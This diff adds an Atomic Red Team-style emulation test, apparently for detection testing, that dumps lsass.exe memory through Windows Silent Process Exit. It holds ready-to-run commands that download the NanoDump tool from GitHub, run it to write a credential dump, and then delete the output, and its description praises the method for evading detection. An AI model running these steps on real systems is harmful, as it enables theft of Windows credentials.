@@ -1,0 +1,105 @@
+{
+  "id": "eb5adf16-b601-4926-bca7-dad22adffb37",
+  "name": "Dump LSASS.exe Memory through Silent Process Exit",
+  "description": "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ee8589e5-9e07-47d7-bcc5-16b0e02d690d",
+      "type": "execute-command",
+      "data": {
+        "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ca46573a-d920-434f-ae99-350cfdf4c183",
+      "type": "execute-command",
+      "data": {
+        "command": "rmdir \"#{output_folder}\" /s /q \u003enul 2\u003e nul\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1f10813f-0dea-42ea-abfe-f08cd33fa8ed",
+      "name": "Check dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ecfc32da-f16b-4561-b69d-8cb5b3f1244b",
+      "name": "Resolve dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "06a05ed6-f719-4e87-8d89-9fb534ad154f",
+      "name": "Re-check dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ee8589e5-9e07-47d7-bcc5-16b0e02d690d",
+      "p": "on-success",
+      "o": "ca46573a-d920-434f-ae99-350cfdf4c183"
+    },
+    {
+      "s": "ee8589e5-9e07-47d7-bcc5-16b0e02d690d",
+      "p": "on-failure",
+      "o": "ca46573a-d920-434f-ae99-350cfdf4c183"
+    },
+    {
+      "s": "1f10813f-0dea-42ea-abfe-f08cd33fa8ed",
+      "p": "on-success",
+      "o": "ee8589e5-9e07-47d7-bcc5-16b0e02d690d"
+    },
+    {
+      "s": "1f10813f-0dea-42ea-abfe-f08cd33fa8ed",
+      "p": "on-failure",
+      "o": "ecfc32da-f16b-4561-b69d-8cb5b3f1244b"
+    },
+    {
+      "s": "ecfc32da-f16b-4561-b69d-8cb5b3f1244b",
+      "p": "on-success",
+      "o": "06a05ed6-f719-4e87-8d89-9fb534ad154f"
+    },
+    {
+      "s": "06a05ed6-f719-4e87-8d89-9fb534ad154f",
+      "p": "on-failure",
+      "o": "ee8589e5-9e07-47d7-bcc5-16b0e02d690d"
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_folder",
+      "type": "path",
+      "description": "Folder Path where resulting dump should be placed",
+      "value": "%temp%\\SilentProcessExit"
+    }
+  ]
+}
